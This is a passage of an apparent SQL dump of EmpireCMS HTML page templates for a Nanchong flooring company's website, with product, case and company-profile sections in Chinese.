#ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587369816,'listtemp',1,'admin'),(135,2,'产品列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\"></script>\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587100611,'listtemp',1,'admin'),(138,3,'通用单页','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>联系我们</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1587100658,'newstemp',1,'admin'),(127,4,'公司实力列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n   \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\"><script type=\\\'text/javascript\\\' src=\\\'/Tools/Advert_js.ashx?id=9\\\'></script>\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]5,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587097298,'listtemp',1,'admin'),(147,4,'公司实力列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n   \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]5,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587369791,'listtemp',1,'admin'),(168,1,'','<!DOCTYPE html\r\n    PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n    <meta name=\\\"viewport\\\"\r\n        content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\" />\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/animate.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/flexslider.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.flexslider-min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n    [!--temp.header--]\r\n    <div class=\\\"banner\\\">\r\n        <section class=\\\"slider\\\">\r\n            <div class=\\\"flexslider\\\">\r\n                <ul class=\\\"slides\\\">\r\n                    <li><img src=\\\'/images/2019092808393246.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/2019092808394458.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/2019092808400053.jpg\\\' /></li>\r\n                </ul>\r\n            </div>\r\n        </section>\r\n    </div>\r\n    <div class=\\\"rmgjc_bg\\\">\r\n        <div class=\\\"rmgjc wow fadeInUp\\\">\r\n            <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n\r\n\r\n                [e:loop={1,3,0,0}]\r\n                <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n                [/e:loop]\r\n            </div>\r\n\r\n\r\n        </div>\r\n    </div>\r\n    <div class=\\\"anli\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>工程案例</p>\r\n            <i>CASE</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"anli_content wow fadeInUp\\\">\r\n            <div class=\\\"picScroll-left\\\">\r\n                <a class=\\\"next\\\"></a>\r\n                <div class=\\\"bd\\\">\r\n                    <ul class=\\\"picList\\\">\r\n\r\n\r\n                        [e:loop={18,10,0,1}]\r\n                        <li>\r\n                            <div class=\\\'pic\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\' /></a>\r\n                            </div>\r\n                            <div class=\\\'title\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?></a></div>\r\n                        </li>\r\n                        [/e:loop]\r\n\r\n                    </ul>\r\n                </div>\r\n                <a class=\\\"prev\\\"></a>\r\n            </div>\r\n        </div>\r\n        <a href=\\\"/gcal/zxal/\\\">了解更多</a>\r\n    </div>\r\n    <div class=\\\"product_bg\\\">\r\n        <div class=\\\"product\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>产品中心</p>\r\n                <i>PRODUCTS</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"product_content\\\">\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gnxdp/\\\">特殊地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img1.jpg\\\'></dt>\r\n                        [e:loop={7,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hydp/\\\">环氧地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img2.jpg\\\'></dt>\r\n                        [e:loop={8,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gdsydp/\\\">高端商业地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img3.jpg\\\'></dt>\r\n                        [e:loop={9,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hwydcs/\\\">户外及运动场所系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img4.jpg\\\'></dt>\r\n                        [e:loop={10,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/dpcl/\\\">地坪材料</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img5.jpg\\\'></dt>\r\n                        [e:loop={11,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"abouts\\\">\r\n        <div class=\\\"abouts1\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>关于丽邦</p>\r\n                <i>ABOUT US</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"shipin wow fadeInRight\\\">\r\n                <div id=\\\"a1\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars = { f: \\\'/images/shipin.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video = [\\\'/images/shipin.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a1\\\', \\\'ckplayer_a1\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars, video, params);\r\n                </script>\r\n                <br/>\r\n                <div id=\\\"a2\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars1 = { f: \\\'/images/shipin1.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params1 = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video1 = [\\\'/images/shipin1.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a2\\\', \\\'ckplayer_a2\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars1, video1, params1);\r\n                </script>\r\n\r\n            </div>\r\n            <div class=\\\"abouts_txt wow fadeInLeft\\\">\r\n                <p> 南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造“你的满意我们的无限动力”的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。\r\n                </p><br />\r\n                <p>我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。\r\n                </p>\r\n                <a href=\\\"/gywm/gsjj/\\\">了解详情</a>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"youshi wow fadeInUp\\\">\r\n        <div class=\\\"youshi_title\\\">\r\n            <p><img src=\\\"/images/youshi_title.jpg\\\" alt=\\\"\\\"></p>\r\n            <span><img src=\\\"/images/youshi_img.jpg\\\" alt=\\\"\\\"></span>\r\n        </div>\r\n        <div class=\\\"youshi_content\\\">\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img2.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico1.png\\\" alt=\\\"\\\"></i>\r\n                    <span>做有针对性地坪设计</span>\r\n                    <p>\r\n                        <font>★</font>考察原基层地面，做好数据分析；<br />\r\n                        <font>★</font>详听甲方需求，匹配优质材料；<br />\r\n                        <font>★</font>探讨设计结果，确定设计方案。\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"youshi_1 youshi_2 wow bounceInRight\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico2.png\\\" alt=\\\"\\\"></i>\r\n                    <span>二十年生产施工经验</span>\r\n                    <p>\r\n                        <font>★</font>生产施工负责人二十年相关经验，综合解决各种地坪需求；<br />\r\n                        <font>★</font>多年培养施工队伍二百余人；<br />\r\n                        <font>★</font>两千多项地坪案列，专为同行提供有偿技术支持。\r\n                    </p>\r\n                    <div class=\\\"youshi_1_txt\\\">\r\n                        <i><img src=\\\"/images/youshi_ico3.png\\\" alt=\\\"\\\"></i>\r\n                        <span>管家式服务，售后有保障</span>\r\n                        <p>\r\n                            <font>★</font>所有项目存档保存，终身售后支持；<br />\r\n                            <font>★</font>定期回访，指导使用、保养措施；<br />\r\n                            <font>★</font>不管项目大小，一视同仁。\r\n        